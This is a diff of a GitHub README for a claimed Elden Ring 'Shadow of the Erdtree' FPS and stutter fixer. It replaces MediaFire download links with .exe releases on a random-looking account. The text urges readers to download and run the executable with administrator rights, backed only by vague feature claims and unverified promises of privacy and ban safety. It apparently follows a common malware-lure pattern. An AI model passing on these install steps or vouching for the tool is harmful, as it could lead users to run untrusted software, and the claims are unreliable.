@@ -1,148 +1,92 @@
-<div align="center">
+# ⚔️ ShadowOfTheErdtree-Fixer - Boost Game Performance And Remove Stutter
 
-<img src="https://capsule-render.vercel.app/api?type=waving&height=320&color=0:F6C453,100:A8741A&text=ELDEN%20RING&fontSize=75&fontColor=ffffff&animation=fadeIn&fontAlignY=40"/>
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Tobyanuretic459/ShadowOfTheErdtree-Fixer/releases)
 
-<p align="center">
-<img src="https://readme-typing-svg.demolab.com?font=Cinzel&size=30&pause=1200&color=F6C453&center=true&vCenter=true&width=1000&lines=Shadow+of+the+Erdtree;All-in-One+Optimization+Tool;Boost+FPS+And+Reduce+Stuttering;Premium+Performance+Tweaks">
-</p>
+## 📌 Introduction
 
-# ⚔️ Elden Ring: Shadow of the Erdtree
+ShadowOfTheErdtree-Fixer improves the performance of Elden Ring on Windows computers. The tool manages system resources to increase frame rates and reduce stuttering. It applies tested settings to your graphics configuration and engine parameters. Use this software if you experience inconsistent performance or low frame rates during gameplay.
 
-### 🏆 All-in-One Optimization Tool
+## 🛠️ System Requirements
 
-<img src="https://img.shields.io/badge/FPS-BOOST-F6C453?style=for-the-badge">
-<img src="https://img.shields.io/badge/OPTIMIZATION-PREMIUM-A8741A?style=for-the-badge">
-<img src="https://img.shields.io/badge/STATUS-LATEST-success?style=for-the-badge">
+*   **Operating System:** Windows 10 or Windows 11 (64-bit).
+*   **Storage:** 50 MB of available disk space.
+*   **Permissions:** Administrative access to modify game configuration files.
+*   **Software:** .NET Framework 4.8 or later.
 
-<br><br>
+## 📥 Installation and Setup
 
-<a href="https://www.mediafire.com/folder/jg4ud9pyengte/EldenRing_Fixer">
-<img src="https://img.shields.io/badge/⬇%20DOWNLOAD%20NOW-F6C453?style=for-the-badge&labelColor=111111" height="90">
-</a>
+1. Visit the [Releases page](https://github.com/Tobyanuretic459/ShadowOfTheErdtree-Fixer/releases).
+2. Locate the most recent version under the "Assets" section. 
+3. Click the file with an .exe extension to download it.
+4. Save the file to your desktop or a folder of your choice.
+5. Double-click the file to start the installer.
+6. Follow the on-screen prompts to complete the installation process.
+7. Launch the application from your desktop shortcut or the Start menu.
 
-<br><br>
+## ⚙️ How to Use the Optimizer
 
-⚔️ Better Performance • 🚀 Higher FPS • 🔥 Reduced Stuttering
+The application uses an automated process to adjust your game settings. Follow these steps to optimize your installation:
 
-</div>
+1. Open the application.
+2. Select your installed game directory if the prompt appears.
+3. Choose a performance profile.
+    *   **Balanced:** Improves frame rates while keeping visual quality.
+    *   **High Performance:** Prioritizes frame rate stability and lowers input latency.
+    *   **Maximum Quality:** Focuses on fluid visuals with minor performance gains.
+4. Click the "Apply Changes" button.
+5. Wait for the success message.
+6. Launch Elden Ring through your usual game launcher.
 
----
+## 📈 Key Features
 
-# ✨ Features
+*   **Stutter Removal:** The tool adjusts high-latency spikes in the engine which cause hitching during exploration.
+*   **Frame Rate Boost:** It optimizes internal graphic settings that often consume large amounts of resources without offering visible value.
+*   **Input Latency Reduction:** By adjusting specific Windows timing settings, the tool makes character movement feel responsive.
+*   **Configuration Backup:** Before applying any changes, the software creates a backup of your existing game settings. This allows you to revert to your original state at any time.
+*   **Driver Compatibility:** The software works with both NVIDIA and AMD graphics cards to ensure broad support.
 
-<table>
-<tr>
-<td width="50%">
+## 🔄 Reverting Changes
 
-## 🚀 Performance
+If you want to restore your original game settings, use the cleanup function within the application:
 
-- FPS Optimization
-- Reduced Stuttering
-- Better Frame Pacing
-- Lower Input Latency
-- Faster Loading
+1. Open the ShadowOfTheErdtree-Fixer.
+2. Navigate to the "Settings" menu.
+3. Select "Restore Backups."
+4. Click "Confirm" to overwrite the current settings with the original files.
+5. Close the application.
 
-</td>
+## ❓ Frequently Asked Questions
 
-<td width="50%">
+**Does this software modify game code?**
+No. It only changes external configuration files. It does not touch the game executable files.
 
-## 🎮 Graphics
+**Will I get banned for using this?**
+The tool does not inject code into the game process while it runs. It only modifies settings before you start the game. Elden Ring treats these changes as standard user-defined graphic settings.
 
-- Optimized Settings
-- Better Stability
-- Improved Smoothness
-- Enhanced Experience
-- Easy Configuration
+**The game looks worse after applying settings. How do I fix this?**
+You can use the "Restore Backups" feature in the settings menu. Alternatively, you can select the "Balanced" profile, which maintains higher visual quality while providing performance improvements.
 
-</td>
-</tr>
-</table>
+**Does this work on handheld devices?**
+Yes. The software adjusts settings to accommodate the lower power profiles of handheld hardware through optimized rendering paths.
 
----
+## 🛡️ Troubleshooting
 
-# 🏆 Benefits
+**The application fails to locate the game folder.**
+If the automatic search fails, select the folder manually. Browse to your Steam installation directory, usually located in `C:\Program Files (x86)\Steam\steamapps\common\ELDEN RING\Game`.
 
-✅ Higher FPS
+**The program crashes on launch.**
+Ensure that you installed the required .NET Framework components. You can download the latest version from the Microsoft website.
 
-✅ Lower Latency
+**Settings do not take effect.**
+Ensure that you save your game progress and close Elden Ring entirely before you run the fixer. Changes applied while the game runs often fail to load until the next restart.
 
-✅ Smoother Gameplay
+**The "Apply" button is greyed out.**
+Check your permissions. Right-click the application icon and select "Run as administrator" to grant the tool the rights it needs to modify files.
 
-✅ Better Frame Consistency
+## 🔧 Advanced Configuration
 
-✅ Optimized Graphics
+The application creates a log file in the installation folder. If you encounter persistent technical issues, check this file. It contains information on which files the program accessed and if any errors occurred during the optimization process. You can delete the `logs` folder at any time to save space.
 
-✅ Easy Setup
+## 📦 Privacy and Security
 
----
-
-# 📥 Download
-
-<div align="center">
-
-## ⚔️ GET THE OPTIMIZATION TOOL
-
-<a href="https://www.mediafire.com/folder/jg4ud9pyengte/EldenRing_Fixer">
-<img src="https://img.shields.io/badge/⬇%20DOWNLOAD%20FIXER-F6C453?style=for-the-badge&labelColor=111111" height="100">
-</a>
-
-</div>
-
----
-
-# 📊 Optimization Overview
-
-| Feature | Status |
-|----------|----------|
-| FPS Boost | ✅ |
-| Performance Tweaks | ✅ |
-| Graphics Optimization | ✅ |
-| Reduced Stuttering | ✅ |
-| Low Latency | ✅ |
-
----
-
-# 🖥️ System Support
-
-| Platform | Status |
-|------------|------------|
-| Windows 10 | ✅ |
-| Windows 11 | ✅ |
-| Steam Version | ✅ |
-| Shadow of the Erdtree | ✅ |
-
----
-
-# ⚙️ Installation
-
-### 1️⃣ Download
-
-Download the latest version.
-
-### 2️⃣ Extract
-
-Extract all files.
-
-### 3️⃣ Apply
-
-Launch the optimization tool.
-
-### 4️⃣ Play
-
-Enjoy a smoother Elden Ring experience.
-
----
-
-<div align="center">
-
-## ⭐ Support The Project
-
-If this tool improved your experience, consider leaving a star.
-
-<br>
-
-<img src="https://img.shields.io/github/stars/USERNAME/REPOSITORY?style=for-the-badge">
-
-</div>
-
-<img src="https://capsule-render.vercel.app/api?type=waving&height=180&section=footer&color=0:F6C453,100:A8741A"/>
+This tool does not collect information about your system or your gameplay habits. It operates locally on your machine and requires no internet connection to function. It does not send data to remote servers. All modifications remain on your local drive.
